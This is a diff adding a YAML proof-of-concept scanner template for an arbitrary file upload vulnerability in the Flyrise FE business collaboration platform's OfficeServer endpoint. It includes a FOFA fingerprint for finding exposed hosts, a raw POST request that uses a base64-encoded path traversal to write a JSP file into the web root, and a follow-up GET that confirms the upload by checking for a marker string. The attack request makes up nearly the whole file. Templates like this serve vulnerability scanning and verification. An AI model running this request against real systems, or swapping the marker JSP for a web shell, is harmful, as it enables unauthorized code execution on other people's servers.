@@ -1,0 +1,31 @@
+id: poc-yaml-flyrise-enterprise-officeserver-anyfile-upload
+info:
+  name: 飞企互联FE业务协作平台 OfficeServer 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: FE业务协作平台
+  fofa: body="flyrise.stopBackspace.js"
+variables:
+  t1: random_int(100,1000)
+  t2: base64("../../../jboss/web/fe.war/" + t1 + ".jsp")
+requests:
+- raw: 'POST /iweboffice/OfficeServer.js%70 HTTP/1.1
+
+
+    DBSTEP V3.0     93                     0        28              DBSTEP=REJTVEVQ
+
+    OPTION=U0FWRUZJTEU=
+
+    RECORDID={{.t2}}
+
+    <%out.println("lOKB4C9g");%>'
+  expression: 'status_code == 200 &&
+
+    !contains(body,"<")
+
+    '
+- method: GET
+  path: /{{.t1}}.jsp;.js
+  expression: status_code == 200 && trim(body) == "lOKB4C9g"
+transport: http
